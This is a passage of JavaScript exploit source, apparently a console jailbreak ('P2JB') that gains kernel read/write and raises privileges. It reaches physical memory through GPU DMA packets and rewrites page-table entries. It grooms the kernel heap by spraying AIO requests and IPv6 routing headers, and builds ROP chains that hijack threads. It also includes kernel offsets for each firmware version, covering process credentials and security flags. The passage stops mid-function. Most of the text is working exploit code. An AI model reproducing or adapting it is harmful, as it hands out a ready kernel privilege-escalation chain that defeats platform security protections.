    const packet_type = 3n;
    const shader_type = 1n;  // compute shader
    const predicate = 0n;    // predicate disable

    const result = (
        (predicate & 0x0n) |                      // Predicated version of packet when set
        ((shader_type & 0x1n) << 1n) |            // 0: Graphics, 1: Compute Shader
        ((opcode & 0xffn) << 8n) |        // IT opcode
        (((count - 1n) & 0x3fffn) << 16n) |  // Number of DWORDs - 1 in the information body
        ((packet_type & 0x3n) << 30n)             // Packet identifier. It should be 3 for type 3 packets
    );

    return result & 0xFFFFFFFFn;
};

gpu.pm4_dma_data = function(dest_va, src_va, length) {
    const count = 6n;
    const bufsize = Number(4n * (count + 1n));
    const opcode = 0x50n;
    const command_len = BigInt(length) & 0x1fffffn;

    const pm4 = malloc(bufsize);

    const dma_data_header = (
        (0n & 0x1n) |                    // engine
        ((0n & 0x1n) << 12n) |           // src_atc
        ((2n & 0x3n) << 13n) |           // src_cache_policy
        ((1n & 0x1n) << 15n) |           // src_volatile
        ((0n & 0x3n) << 20n) |           // dst_sel (DmaDataDst enum)
        ((0n & 0x1n) << 24n) |           // dst_atc
        ((2n & 0x3n) << 25n) |           // dst_cache_policy
        ((1n & 0x1n) << 27n) |           // dst_volatile
        ((0n & 0x3n) << 29n) |           // src_sel (DmaDataSrc enum)
        ((1n & 0x1n) << 31n)             // cp_sync
    ) & 0xFFFFFFFFn;

    write32_uncompressed(pm4, gpu.pm4_type3_header(opcode, count)); // pm4 header
    write32_uncompressed(pm4 + 0x4n, dma_data_header); // dma data header (copy: mem -> mem)
    write32_uncompressed(pm4 + 0x8n, src_va & 0xFFFFFFFFn);
    write32_uncompressed(pm4 + 0xcn, src_va >> 32n);
    write32_uncompressed(pm4 + 0x10n, dest_va & 0xFFFFFFFFn);
    write32_uncompressed(pm4 + 0x14n, dest_va >> 32n);
    write32_uncompressed(pm4 + 0x18n, command_len);

    return read_buffer(pm4, bufsize);
};

gpu.submit_dma_data_command = function(dest_va, src_va, size) {
    // Prep command buf
    const dma_data = gpu.pm4_dma_data(dest_va, src_va, size);
    write_buffer(gpu.cmd_va, dma_data);

    // Build command descriptor manually
    const desc = gpu.build_command_descriptor(gpu.cmd_va, dma_data.length);

    const pipe_id = 0;

    gpu.ioctl_gpu_sync();

    // Submit to gpu via direct ioctl
    gpu.ioctl_submit_commands(pipe_id, 1, desc);

    gpu.ioctl_gpu_sync();

    // Wait for completion
    gpu.ioctl_wait_done();
};

gpu.transfer_physical_buffer = function(phys_addr, size, is_write) {
    const trunc_phys_addr = phys_addr & ~(gpu.dmem_size - 1n);
    const offset = phys_addr - trunc_phys_addr;

    if (offset + BigInt(size) > gpu.dmem_size) {
        throw new Error("error: trying to write more than direct memory size: " + size);
    }

    const prot_ro = PROT_READ | PROT_WRITE | GPU_READ;
    const prot_rw = prot_ro | GPU_WRITE;

    // Remap PTD
    if (syscall(SYSCALL.mprotect, gpu.victim_va, gpu.dmem_size, prot_ro) === 0xffffffffffffffffn) {
        throw new Error("mprotect() error");
    }

    const new_ptb = gpu.cleared_victim_ptbe_for_ro | trunc_phys_addr;
    kernel.write_qword(gpu.victim_ptbe_va, new_ptb);

    if (syscall(SYSCALL.mprotect, gpu.victim_va, gpu.dmem_size, prot_rw) === 0xffffffffffffffffn) {
        throw new Error("mprotect() error");
    }

    let src, dst;

    if (is_write) {
        src = gpu.transfer_va;
        dst = gpu.victim_va + offset;
    } else {
        src = gpu.victim_va + offset;
        dst = gpu.transfer_va;
    }

    // Do the DMA operation
    gpu.submit_dma_data_command(dst, src, size);
};

gpu.read_buffer = function(addr, size) {
    const phys_addr = virt_to_phys(addr, kernel.addr.kernel_cr3);
    if (!phys_addr) {
        throw new Error("failed to translate " + hex(addr) + " to physical addr");
    }

    gpu.transfer_physical_buffer(phys_addr, size, false);
    return read_buffer(gpu.transfer_va, size);
};

gpu.write_buffer = function(addr, buf) {
    const phys_addr = virt_to_phys(addr, kernel.addr.kernel_cr3);
    if (!phys_addr) {
        throw new Error("failed to translate " + hex(addr) + " to physical addr");
    }

    write_buffer(gpu.transfer_va, buf); // prepare data for write
    gpu.transfer_physical_buffer(phys_addr, buf.length, true);
};

gpu.read_byte = function(kaddr) {
    const value = gpu.read_buffer(kaddr, 1);
    return value && value.length === 1 ? BigInt(value[0]) : null;
};

gpu.read_word = function(kaddr) {
    const value = gpu.read_buffer(kaddr, 2);
    if (!value || value.length !== 2) return null;
    return BigInt(value[0]) | (BigInt(value[1]) << 8n);
};

gpu.read_dword = function(kaddr) {
    const value = gpu.read_buffer(kaddr, 4);
    if (!value || value.length !== 4) return null;
    let result = 0n;
    for (let i = 0; i < 4; i++) {
        result |= (BigInt(value[i]) << BigInt(i * 8));
    }
    return result;
};

gpu.read_qword = function(kaddr) {
    const value = gpu.read_buffer(kaddr, 8);
    if (!value || value.length !== 8) return null;
    let result = 0n;
    for (let i = 0; i < 8; i++) {
        result |= (BigInt(value[i]) << BigInt(i * 8));
    }
    return result;
};

gpu.write_byte = function(dest, value) {
    const buf = new Uint8Array(1);
    buf[0] = Number(value & 0xFFn);
    gpu.write_buffer(dest, buf);
};

gpu.write_word = function(dest, value) {
    const buf = new Uint8Array(2);
    buf[0] = Number(value & 0xFFn);
    buf[1] = Number((value >> 8n) & 0xFFn);
    gpu.write_buffer(dest, buf);
};

gpu.write_dword = function(dest, value) {
    const buf = new Uint8Array(4);
    for (let i = 0; i < 4; i++) {
        buf[i] = Number((value >> BigInt(i * 8)) & 0xFFn);
    }
    gpu.write_buffer(dest, buf);
};

gpu.write_qword = function(dest, value) {
    const buf = new Uint8Array(8);
    for (let i = 0; i < 8; i++) {
        buf[i] = Number((value >> BigInt(i * 8)) & 0xFFn);
    }
    gpu.write_buffer(dest, buf);
};

// Misc functions

function alloc_main_dmem(size, prot, flag) {
    if (!size || prot === null || prot === undefined) {
        throw new Error("alloc_main_dmem: size and prot are required");
    }

    const out = malloc(8);
    const mem_type = 1n;

    const size_big = typeof size === "bigint" ? size : BigInt(size);
    const prot_big = typeof prot === "bigint" ? prot : BigInt(prot);
    const flag_big = typeof flag === "bigint" ? flag : BigInt(flag);

    const ret = call(sceKernelAllocateMainDirectMemory, size_big, size_big, mem_type, out);
    if (ret !== 0n) {
        throw new Error("sceKernelAllocateMainDirectMemory() error: " + hex(ret));
    }

    const phys_addr = read64_uncompressed(out);
    write64_uncompressed(out, 0n);

    // Dummy name
    const name_buf = alloc_string("mem");

    //const ret2 = call(sceKernelMapNamedDirectMemory, out, size_big, prot_big, flag_big, phys_addr, size_big, name_buf);
    const ret2 = call(sceKernelMapDirectMemory, out, size_big, prot_big, flag_big, phys_addr, size_big);
    if (ret2 !== 0n) {
        //throw new Error("sceKernelMapNamedDirectMemory() error: " + hex(ret2));
        throw new Error("sceKernelMapDirectMemory() error: " + hex(ret2));
    }

    return read64_uncompressed(out);
}

function get_curproc_vmid() {
    const vmspace = kernel.read_qword(kernel.addr.curproc + kernel_offset.PROC_VM_SPACE);
    const vmid = kernel.read_dword(vmspace + kernel_offset.VMSPACE_VM_VMID);
    return Number(vmid);
}

function get_gvmspace(vmid) {
    if (vmid === null || vmid === undefined) {
        throw new Error("vmid is required");
    }
    const vmid_big = typeof vmid === "bigint" ? vmid : BigInt(vmid);
    const gvmspace_base = kernel.addr.data_base + kernel_offset.DATA_BASE_GVMSPACE;
    return gvmspace_base + vmid_big * kernel_offset.SIZEOF_GVMSPACE;
}

function get_pdb2_addr(vmid) {
    const gvmspace = get_gvmspace(vmid);
    return kernel.read_qword(gvmspace + kernel_offset.GVMSPACE_PAGE_DIR_VA);
}

function get_relative_va(vmid, va) {
    if (typeof va !== "bigint") {
        throw new Error("va must be BigInt");
    }

    const gvmspace = get_gvmspace(vmid);

    const size = kernel.read_qword(gvmspace + kernel_offset.GVMSPACE_SIZE);
    const start_addr = kernel.read_qword(gvmspace + kernel_offset.GVMSPACE_START_VA);
    const end_addr = start_addr + size;

    if (va >= start_addr && va < end_addr) {
        return va - start_addr;
    }

    return null;
}

function get_ptb_entry_of_relative_va(virt_addr) {
    const vmid = get_curproc_vmid();
    const relative_va = get_relative_va(vmid, virt_addr);

    if (!relative_va) {
        throw new Error("invalid virtual addr " + hex(virt_addr) + " for vmid " + vmid);
    }

    return gpu_walk_pt(vmid, relative_va);
}

function wait_for(addr, threshold) {
    while (read64_uncompressed(addr) !== threshold) {
        nanosleep(1);
    }
}

function pin_to_core(core) {
    const mask = malloc(0x10);
    write32_uncompressed(mask, BigInt(1 << core));
    syscall(SYSCALL.cpuset_setaffinity, 3n, 1n, -1n, 0x10n, mask);
}

function get_core_index(mask_addr) {
    let num = Number(read32_uncompressed(mask_addr));
    let position = 0;
    while (num > 0) {
        num = num >>> 1;
        position++;
    }
    return position - 1;
}

function get_current_core() {
    const mask = malloc(0x10);
    syscall(SYSCALL.cpuset_getaffinity, 3n, 1n, -1n, 0x10n, mask);
    return get_core_index(mask);
}

function set_rtprio(prio) {
    const rtprio = malloc(0x4);
    write16_uncompressed(rtprio, PRI_REALTIME);
    write16_uncompressed(rtprio + 2n, BigInt(prio));
    syscall(SYSCALL.rtprio_thread, RTP_SET, 0n, rtprio);
}

function get_rtprio() {
    const rtprio = malloc(0x4);
    write16_uncompressed(rtprio, PRI_REALTIME);
    write16_uncompressed(rtprio + 2n, 0n);
    syscall(SYSCALL.rtprio_thread, RTP_SET, 0n, rtprio);
    return read16_uncompressed(rtprio + 0x2n);
}

function new_socket() {
    const sd = syscall(SYSCALL.socket, AF_INET6, SOCK_DGRAM, IPPROTO_UDP);
    if (sd === 0xffffffffffffffffn) {
        throw new Error("new_socket error: " + hex(sd));
    }
    return sd
}

function new_tcp_socket() {
    const sd = syscall(SYSCALL.socket, AF_INET, SOCK_STREAM, 0n);
    if (sd === 0xffffffffffffffffn) {
        throw new Error("new_tcp_socket error: " + hex(sd));
    }
    return sd
}

function set_sockopt(sd, level, optname, optval, optlen) {
    const result = syscall(SYSCALL.setsockopt, BigInt(sd), level, optname, optval, BigInt(optlen));
    if (result === 0xffffffffffffffffn) {
        throw new Error("set_sockopt error: " + hex(result));
    }
    return result;
}

function get_sockopt(sd, level, optname, optval, optlen) {
    const len_ptr = malloc(4);
    write32_uncompressed(len_ptr, BigInt(optlen));
    const result = syscall(SYSCALL.getsockopt, BigInt(sd), level, optname, optval, len_ptr);
    if (result === 0xffffffffffffffffn) {
        throw new Error("get_sockopt error: " + hex(result));
    }
    return read32_uncompressed(len_ptr);
}

function set_rthdr(sd, buf, len) {
    return set_sockopt(sd, IPPROTO_IPV6, IPV6_RTHDR, buf, len);
}

function get_rthdr(sd, buf, max_len) {
    return get_sockopt(sd, IPPROTO_IPV6, IPV6_RTHDR, buf, max_len);
}

function free_rthdrs(sds) {
    for (let i = 0; i < sds.length; i++) {
        if (sds[i] !== 0xffffffffffffffffn) {
            set_sockopt(sds[i], IPPROTO_IPV6, IPV6_RTHDR, 0n, 0);
        }
    }
}

function build_rthdr(buf, size) {
    const len = ((Number(size) >> 3) - 1) & ~1;
    const actual_size = (len + 1) << 3;
        write8_uncompressed(buf, 0n);
        write8_uncompressed(buf + 1n, BigInt(len));
        write8_uncompressed(buf + 2n, 0n);
        write8_uncompressed(buf + 3n, BigInt(len >> 1));
    return actual_size;
}

function aton(ip_str) {
    const parts = ip_str.split('.').map(Number);
    return (parts[3] << 24) | (parts[2] << 16) | (parts[1] << 8) | parts[0];
}

function aio_submit_cmd(cmd, reqs, num_reqs, priority, ids) {
    const result = syscall(SYSCALL.aio_submit_cmd, cmd, reqs, BigInt(num_reqs), priority, ids);
    if (result === 0xffffffffffffffffn) {
        throw new Error("aio_submit_cmd error: " + hex(result));
    }
    return result;
}

function aio_multi_delete(ids, num_ids, states) {
    const result = syscall(SYSCALL.aio_multi_delete, ids, BigInt(num_ids), states);
    if (result === 0xffffffffffffffffn) {
        throw new Error("aio_multi_delete error: " + hex(result));
    }
    return result;
}

function aio_multi_poll(ids, num_ids, states) {
    const result = syscall(SYSCALL.aio_multi_poll, ids, BigInt(num_ids), states);
    if (result === 0xffffffffffffffffn) {
        throw new Error("aio_multi_poll error: " + hex(result));
    }
    return result;
}

function aio_multi_cancel(ids, num_ids, states) {
    const result = syscall(SYSCALL.aio_multi_cancel, ids, BigInt(num_ids), states);
    if (result === 0xffffffffffffffffn) {
        throw new Error("aio_multi_cancel error: " + hex(result));
    }
    return result;
}

function aio_multi_wait(ids, num_ids, states, mode, timeout) {
    const result = syscall(SYSCALL.aio_multi_wait, ids, BigInt(num_ids), states, BigInt(mode), timeout);
    if (result === 0xffffffffffffffffn) {
        throw new Error("aio_multi_wait error: " + hex(result));
    }
    return result;
}

function make_reqs1(num_reqs) {
    const reqs = malloc(0x28 * num_reqs);
    for (let i = 0; i < num_reqs; i++) {
        write32_uncompressed(reqs + BigInt(i * 0x28 + 0x20), -1n);
    }
    return reqs;
}

function spray_aio(loops, reqs, num_reqs, ids, multi, cmd) {
    loops = loops || 1;
    cmd = cmd || AIO_CMD_READ;
    if (multi === undefined) multi = true;

    const step = 4 * (multi ? num_reqs : 1);
    const final_cmd = cmd | (multi ? AIO_CMD_FLAG_MULTI : 0n);

    for (let i = 0; i < loops; i++) {
        aio_submit_cmd(final_cmd, reqs, num_reqs, 3n, ids + BigInt(i * step));
    }
}

function cancel_aios(ids, num_ids) {
    const len = MAX_AIO_IDS;
    const rem = num_ids % len;
    const num_batches = Math.floor((num_ids - rem) / len);

    const errors = malloc(4 * len);

    for (let i = 0; i < num_batches; i++) {
        aio_multi_cancel(ids + BigInt(i * 4 * len), len, errors);
    }

    if (rem > 0) {
        aio_multi_cancel(ids + BigInt(num_batches * 4 * len), rem, errors);
    }
}

function free_aios(ids, num_ids, do_cancel) {
    if (do_cancel === undefined) do_cancel = true;

    const len = MAX_AIO_IDS;
    const rem = num_ids % len;
    const num_batches = Math.floor((num_ids - rem) / len);

    const errors = malloc(4 * len);

    for (let i = 0; i < num_batches; i++) {
        const addr = ids + BigInt(i * 4 * len);
        if (do_cancel) {
            aio_multi_cancel(addr, len, errors);
        }
        aio_multi_poll(addr, len, errors);
        aio_multi_delete(addr, len, errors);
    }

    if (rem > 0) {
        const addr = ids + BigInt(num_batches * 4 * len);
        if (do_cancel) {
            aio_multi_cancel(addr, rem, errors);
        }
        aio_multi_poll(addr, rem, errors);
        aio_multi_delete(addr, rem, errors);
    }
}

function free_aios2(ids, num_ids) {
    free_aios(ids, num_ids, false);
}

function call_suspend_chain_rop(pipe_write_fd, pipe_buf, thr_tid) {
    write64(add_rop_smash_code_store, 0xab0025n);
    real_rbp = addrof(rop_smash(1)) + 0x700000000n -1n +2n;

    let rop_i = 0;

    // write(pipe_write_fd, pipe_buf, 1)
    fake_rop[rop_i++] = g.get('pop_rax'); // pop rax ; ret
    fake_rop[rop_i++] = SYSCALL.write;
    fake_rop[rop_i++] = g.get('pop_rdi'); // pop rdi ; ret
    fake_rop[rop_i++] = pipe_write_fd;
    fake_rop[rop_i++] = g.get('pop_rsi'); // pop rsi ; ret
    fake_rop[rop_i++] = pipe_buf;
    fake_rop[rop_i++] = g.get('pop_rdx'); // pop rdx ; ret
    fake_rop[rop_i++] = 1n;
    fake_rop[rop_i++] = syscall_wrapper;

    fake_rop[rop_i++] = g.get('pop_rax'); // pop rax ; ret
    fake_rop[rop_i++] = SYSCALL.sched_yield;
    fake_rop[rop_i++] = syscall_wrapper;

    fake_rop[rop_i++] = g.get('pop_rax'); // pop rax ; ret
    fake_rop[rop_i++] = SYSCALL.thr_suspend_ucontext;
    fake_rop[rop_i++] = g.get('pop_rdi'); // pop rdi ; ret
    fake_rop[rop_i++] = thr_tid;
    fake_rop[rop_i++] = syscall_wrapper;

    fake_rop[rop_i++] = g.get('pop_rdi'); // pop rdi ; ret
    fake_rop[rop_i++] = base_heap_add + fake_rop_return;
    fake_rop[rop_i++] = g.get('mov_qword_ptr_rdi_rax'); // mov qword [rdi], rax ; ret

    // Return safe tagged value to JavaScript
    fake_rop[rop_i++] = g.get('pop_rax'); // mov rax, 0x200000000 ; ret
    fake_rop[rop_i++] = 0x2000n;                 // Fake value in RAX to make JS happy
    fake_rop[rop_i++] = g.get('pop_rsp_pop_rbp');
    fake_rop[rop_i++] = real_rbp;

    write64(add_rop_smash_code_store, 0xab00260325n);
    oob_arr[39] = base_heap_add + fake_frame;
    rop_smash(obj_arr[0]);          // Call ROP
}

function call_suspend_chain(pipe_write_fd, pipe_buf, thr_tid) {
    call_suspend_chain_rop(pipe_write_fd, pipe_buf, thr_tid);
    return read64(fake_rop_return);
}

function init_threading() {

    const jmpbuf = malloc(0x60);

    call(setjmp_addr, jmpbuf);
    saved_fpu_ctrl = Number(read32_uncompressed(jmpbuf + 0x40n));
    saved_mxcsr = Number(read32_uncompressed(jmpbuf + 0x44n));
}

function spawn_thread(fake_rop_race1_array) {
    const fake_rop_race1_addr = get_backing_store(fake_rop_race1_array);

    const jmpbuf = malloc(0x60);

    write64_uncompressed(jmpbuf + 0x00n, g.get('ret'));      // ret addr (RIP)
    write64_uncompressed(jmpbuf + 0x10n, fake_rop_race1_addr);             // RSP - pivot to fake_rop_race1
    write32_uncompressed(jmpbuf + 0x40n, BigInt(saved_fpu_ctrl));   // FPU control word
    write32_uncompressed(jmpbuf + 0x44n, BigInt(saved_mxcsr));      // MXCSR

    const stack_size = 0x400n;
    const tls_size = 0x40n;

    const thr_new_args = malloc(0x80);
    const tid_addr = malloc(0x8);
    const cpid = malloc(0x8);
    const stack = malloc(Number(stack_size));
    const tls = malloc(Number(tls_size));

    write64_uncompressed(thr_new_args + 0x00n, longjmp_addr);       // start_func = longjmp
    write64_uncompressed(thr_new_args + 0x08n, jmpbuf);             // arg = jmpbuf
    write64_uncompressed(thr_new_args + 0x10n, stack);              // stack_base
    write64_uncompressed(thr_new_args + 0x18n, stack_size);         // stack_size
    write64_uncompressed(thr_new_args + 0x20n, tls);                // tls_base
    write64_uncompressed(thr_new_args + 0x28n, tls_size);           // tls_size
    write64_uncompressed(thr_new_args + 0x30n, tid_addr);           // child_tid (output)
    write64_uncompressed(thr_new_args + 0x38n, cpid);               // parent_tid (output)

    const result = syscall(SYSCALL.thr_new, thr_new_args, 0x68n);

    if (result !== 0n) {
        throw new Error("thr_new failed: " + hex(result));
    }

    const tid = read64_uncompressed(tid_addr);
    return tid;
}


(function () {
    try {
        const p2jb_version = "P2JB 0.1 (Y2JB v2 -> NFJB port)";

        const PAGE_SIZE = 0x4000;

        const AF_UNIX = 1n;
        const AF_INET6 = 28n;
        const SOCK_STREAM = 1n;
        const IPPROTO_IPV6 = 41n;
        const IPV6_RTHDR = 51n;

        const SOL_SOCKET = 0xffffn;
        const SO_SNDBUF = 0x1001n;

        const UMTX_OP_WAKE = 3n;

        const RTP_SET = 1n;
        const PRI_REALTIME = 2n;

        const F_SETFL = 4n;
        const O_NONBLOCK = 4n;

        const SYSTEM_AUTHID = 0x4800000000010003n;

        const UCRED_SIZE = 360;
        const RTHDR_TAG = 0x13370000;
        const MSG_IOV_NUM = 23;
        const IOV_THREAD_NUM = 4;
        const UIO_THREAD_NUM = 4;
        const UIO_IOV_COUNT = 20n;

        const LAUNCH_ELF_LOADER = false;

        const ENABLE_DEBUG_MENU = true;
        const UIO_SYSSPACE = 1n;

        const TRIPLEFREE_ATTEMPTS = 96;
        const MAX_ROUNDS_TWIN = 10;
        const MAX_ROUNDS_TRIPLET = 500;
        const FIND_TRIPLET_FAST = 5000;
        const FREE_FDS_NUM = 1024;

        const NUM_IPV6_SOCKETS = 64;
        const MAIN_CORE = 4;
        const MAIN_RTPRIO = 256;

        const SYSCALL_EXTRA = {
            recvmsg: 0x1bn,
            socketpair: 0x87n,
            kqueue: 0x16an,
            kqueueex: 0x8Dn,
            readv: 0x78n,
            writev: 0x79n,
            cpuset_setaffinity: 0x1e8n,
            cpuset_getaffinity: 0x1e7n,
            rtprio_thread: 0x1d2n,
            thr_new: 0x1c7n,
            thr_exit: 0x1afn,
            thr_kill: 0x1b1n,
            umtx_op: 0x1c6n,
            sched_yield: 0x14bn,
            setuid: 0x17n,
            setrlimit: 0xC3n,
        };
        for (const k in SYSCALL_EXTRA) {
            if (!(k in SYSCALL)) SYSCALL[k] = SYSCALL_EXTRA[k];
        }

        const FW_OFFSETS_P2JB = {
            "9.00": {
                DATA_BASE_ALLPROC: 0x02755D50n,
                DATA_BASE_SECURITY_FLAGS: 0x00D72064n,
                DATA_BASE_ROOTVNODE: 0x02FDB510n,
                DATA_BASE_KERNEL_PMAP_STORE: 0x02D28B78n,
                DATA_BASE_GVMSPACE: 0x02D8A570n,
            },
            "9.05": {
                DATA_BASE_ALLPROC: 0x02755D50n,
                DATA_BASE_SECURITY_FLAGS: 0x00D73064n,
                DATA_BASE_ROOTVNODE: 0x02FDB510n,
                DATA_BASE_KERNEL_PMAP_STORE: 0x02D28B78n,
                DATA_BASE_GVMSPACE: 0x02D8A570n,
            },
            "10.00": {
                DATA_BASE_ALLPROC: 0x02765D70n,
                DATA_BASE_SECURITY_FLAGS: 0x00D79064n,
                DATA_BASE_ROOTVNODE: 0x02FA3510n,
                DATA_BASE_KERNEL_PMAP_STORE: 0x02CF0EF8n,
                DATA_BASE_GVMSPACE: 0x02D52570n,
            },
            "11.00": {
                DATA_BASE_ALLPROC: 0x02875D70n,
                DATA_BASE_SECURITY_FLAGS: 0x00D8C064n,
                DATA_BASE_ROOTVNODE: 0x030B7510n,
                DATA_BASE_KERNEL_PMAP_STORE: 0x02E04F18n,
                DATA_BASE_GVMSPACE: 0x02E66570n,
            },
            "12.00": {
                DATA_BASE_ALLPROC: 0x02885E00n,
                DATA_BASE_SECURITY_FLAGS: 0x00D83064n,
                DATA_BASE_ROOTVNODE: 0x030D7510n,
                DATA_BASE_KERNEL_PMAP_STORE: 0x02E1CFB8n,
                DATA_BASE_GVMSPACE: 0x02E7E570n,
            },
        };
        const FW_ALIAS_P2JB = {
            "9.00": "9.00",
            "9.03": "9.05", "9.04": "9.05", "9.20": "9.05", "9.40": "9.05", "9.51": "9.05", "9.60": "9.05",
            "10.00": "10.00", "10.01": "10.00", "10.20": "10.00", "10.40": "10.00", "10.50": "10.00", "10.60": "10.00", "10.70": "10.00",
            "11.00": "11.00", "11.02": "11.00", "11.20": "11.00", "11.40": "11.00",
            "11.50": "11.00", "11.60": "11.00", "11.61": "11.00",
            "12.00": "12.00", "12.02": "12.00", "12.20": "12.00", "12.40": "12.00",
            "12.50": "12.00", "12.60": "12.00", "12.70": "12.00",
        };

        function ensure_kernel_offset() {
            try {
                if (typeof kernel_offset === "object" && kernel_offset !== null
                    && kernel_offset.DATA_BASE_ALLPROC !== undefined) return;
                kernel_offset = get_kernel_offset();
                return;
            } catch (_) { }

            let key = FW_VERSION;
            if (FW_ALIAS_P2JB[key]) key = FW_ALIAS_P2JB[key];
            let fw = FW_OFFSETS_P2JB[key];
            if (!fw) {
                const major = FW_VERSION.split(".")[0];
                fw = FW_OFFSETS_P2JB[major + ".00"];
            }
            if (!fw) throw new Error("p2jb: FW " + FW_VERSION + " not supported");

            kernel_offset = {
                DATA_BASE: null, DATA_SIZE: null,
                DATA_BASE_DYNAMIC: 0x10000n, DATA_BASE_TO_DYNAMIC: null,
                DATA_BASE_ALLPROC: fw.DATA_BASE_ALLPROC,
                DATA_BASE_SECURITY_FLAGS: fw.DATA_BASE_SECURITY_FLAGS,
                DATA_BASE_ROOTVNODE: fw.DATA_BASE_ROOTVNODE,
                DATA_BASE_KERNEL_PMAP_STORE: fw.DATA_BASE_KERNEL_PMAP_STORE,
                DATA_BASE_GVMSPACE: fw.DATA_BASE_GVMSPACE,
                DATA_BASE_TARGET_ID: fw.DATA_BASE_SECURITY_FLAGS + 0x09n,
                DATA_BASE_QA_FLAGS: fw.DATA_BASE_SECURITY_FLAGS + 0x24n,
                DATA_BASE_UTOKEN_FLAGS: fw.DATA_BASE_SECURITY_FLAGS + 0x8Cn,

                PROC_PID: 0xBCn, PROC_UCRED: 0x40n, PROC_FD: 0x48n, PROC_VM_SPACE: 0x200n,
                PROC_COMM: -1n, PROC_SYSENT: -1n,

                UCRED_CR_UID: 0x04n, UCRED_CR_RUID: 0x08n, UCRED_CR_SVUID: 0x0Cn,
                UCRED_CR_NGROUPS: 0x10n, UCRED_CR_RGID: 0x14n, UCRED_CR_PRISON: 0x30n,
                UCRED_CR_SCEAUTHID: 0x58n, UCRED_CR_SCECAPS0: 0x60n,
                UCRED_CR_SCECAPS1: 0x68n, UCRED_CR_SCEATTRS: 0x83n,

                FILEDESC_OFILES: 0x00n, FDESCENTTBL_HDR: 0x08n,
                FILEDESCENT_SIZE: 0x30n, SIZEOF_OFILES: 0x30n,

                FD_RDIR: 0x10n, FD_JDIR: 0x18n, KQ_FDP: 0xA8n, KL_LOCK: 0x68n,

                INPCB_PKTOPTS: 0x120n, IP6PO_RTHDR: 0x70n, SO_PCB: 0x18n,

                PIPE_SIGIO: 0xD8n,

                PMAP_CR3: 0x28n, PMAP_PML4: 0x20n,
            };
        }


        let saved_fpu_ctrl = 0;
        let saved_mxcsr = 0;

        let failcheck_path = null;

        function my_init_threading() {
            const jmpbuf = malloc(0x60);
            call(setjmp_addr, jmpbuf);
            saved_fpu_ctrl = Number(read32_uncompressed(jmpbuf + 0x40n));
            saved_mxcsr = Number(read32_uncompressed(jmpbuf + 0x44n));
        }

        function spawn_leak_worker(chain_addr) {
            // Zero a scratch buffer and fill all jmpbuf slots with it so callee-saved
            // registers (RBX, RBP, R12-R15) have a valid pointer after longjmp, not
            // uninitialized malloc garbage that would fault on first use.
            const scratch = malloc(0x100);
            for (let i = 0; i < 0x100; i += 8) write64_uncompressed(scratch + BigInt(i), 0n);
            const jb = malloc(0x60);
            for (let i = 0; i < 0x60; i += 8) write64_uncompressed(jb + BigInt(i), scratch);

            write64_uncompressed(jb + 0x00n, g.get('ret'));
            write64_uncompressed(jb + 0x10n, chain_addr);
            write32_uncompressed(jb + 0x40n, BigInt(saved_fpu_ctrl));
            write32_uncompressed(jb + 0x44n, BigInt(saved_mxcsr));

            const stack_size = 0x400n;
            const tls_size = 0x40n;
            // Zero thr_new_args so flags[0x40] and rtp[0x48] are 0, not garbage that
            // could set THR_SUSPENDED or cause a kernel dereference of a junk rtp pointer.
            const thr_new_args = malloc(0x80);
            for (let i = 0; i < 0x80; i += 8) write64_uncompressed(thr_new_args + BigInt(i), 0n);
            const tid_addr = malloc(0x8);
            const cpid = malloc(0x8);
            const stack = malloc(Number(stack_size));
            const tls = malloc(Number(tls_size));

            write64_uncompressed(thr_new_args + 0x00n, longjmp_addr);
            write64_uncompressed(thr_new_args + 0x08n, jb);
            write64_uncompressed(thr_new_args + 0x10n, stack);
            write64_uncompressed(thr_new_args + 0x18n, stack_size);
            write64_uncompressed(thr_new_args + 0x20n, tls);
            write64_uncompressed(thr_new_args + 0x28n, tls_size);
            write64_uncompressed(thr_new_args + 0x30n, tid_addr);
            write64_uncompressed(thr_new_args + 0x38n, cpid);

            const ret = syscall(SYSCALL.thr_new, thr_new_args, 0x68n);
            if (ret !== 0n) fail("leak worker Thrd_create failed: " + toHex(ret));
            const tid = read64_uncompressed(tid_addr);
            return tid;
        }

        function build_leak_worker_chain(core, pipe_rfd, finished_addr, dummybuf, unroll, remainder) {
            const total_slots = unroll * 31 + remainder * 6 + 0x200;
            const POC_ARG = 0x800000000000n;
            const EXIT_MARK = 0xDEADn;
            const STACK_SIZE = 0x4000 + total_slots * 8;

            // Allocate the chain buffer and keep the ArrayBuffer reference so we can
            // write gadgets via a BigUint64Array view, bypassing write64_uncompressed, avoiding gc
            const buf = malloc(STACK_SIZE);
            const chain_ab = allocated_buffers[allocated_buffers.length - 1];
            const chain_view = new BigUint64Array(chain_ab);

            // Zero the guard region (first 0x4000 bytes = 0x800 u64 entries).
            chain_view.fill(0n, 0, 0x800);

            const entry = buf + 0x4000n;
            const ENTRY_START = 0x800; // chain_view index where the ROP chain starts

            const mask = malloc(0x10);
            write64_uncompressed(mask + 0x0n, 1n << BigInt(core));
            write64_uncompressed(mask + 0x8n, 0n);

            const rop_ret = g.get('ret');
            const rop_pop_rax = g.get('pop_rax');
            const rop_pop_rdi = g.get('pop_rdi');
            const rop_pop_rsi = g.get('pop_rsi');
            const rop_pop_rdx = g.get('pop_rdx');
            const rop_pop_rcx = g.get('pop_rcx');
            const rop_pop_r8 = g.get('pop_r8');
            const rop_pop_rsp = g.get('pop_rsp');
            const rop_mov = g.get('mov_qword_ptr_rdi_rax');
            const pipe_rfd_n = BigInt(pipe_rfd);

            let idx = 0;
            const emit = (v) => { chain_view[ENTRY_START + idx++] = v; };
            // at() converts a slot index to its in-memory address.
            // Only called in repairSlot (~20k times), not in the emit hot path.
            const at = (i) => entry + BigInt(i * 8);

            emit(rop_ret);
            emit(rop_ret);

            emit(rop_pop_rax); emit(SYSCALL.cpuset_setaffinity);
            emit(rop_pop_rdi); emit(3n);
            emit(rop_pop_rsi); emit(1n);
            emit(rop_pop_rdx); emit(0xFFFFFFFFFFFFFFFFn);
            emit(rop_pop_rcx); emit(0x10n);
            emit(rop_pop_r8); emit(mask);
            emit(syscall_wrapper);
            emit(rop_ret);
            const LOOP_START = idx;

            const readBase = idx;
            emit(rop_pop_rax); emit(SYSCALL.read);
            emit(rop_pop_rdi); emit(pipe_rfd_n);
            emit(rop_pop_rsi); emit(dummybuf);
            emit(rop_pop_rdx); emit(1n);
            emit(syscall_wrapper);
            emit(rop_ret);

            const kqBase = [];
            for (let k = 0; k < unroll; k++) {
                kqBase.push(idx);
                emit(rop_pop_rax); emit(SYSCALL.kqueueex);
                emit(rop_pop_rdi); emit(POC_ARG);
                emit(syscall_wrapper);
                emit(rop_ret);
            }

            const repairSlot = (slotIdx, value) => {
